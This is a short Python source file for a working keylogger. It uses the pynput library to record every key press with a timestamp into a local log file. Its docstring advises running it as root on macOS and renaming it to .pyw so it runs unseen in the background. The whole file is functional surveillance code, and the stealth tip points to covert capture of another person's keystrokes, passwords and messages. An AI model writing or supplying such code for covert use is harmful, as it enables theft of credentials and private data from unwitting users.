# keylogger.py

'''
Actual keylogger implementation,
This will create **KEY_LOG.txt** and log in it
*** Run this script as a root user if you are using OSX ***
! you can change extension from ** .py ** to ** .pyw ** , if you want to run the script on background
'''

import logging
from pynput import keyboard

__dir__ = ''

logging.basicConfig(
	filename=(__dir__ + 'Key_Log.txt'),
	level = logging.DEBUG,
	format = '%(asctime)s ===> %(message)s' )

def on_press(key):
	print(key)
	logging.info(key) # Logging key

def on_release(key):
	if key == keyboard.Key.esc:
		# Stop listener
		return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()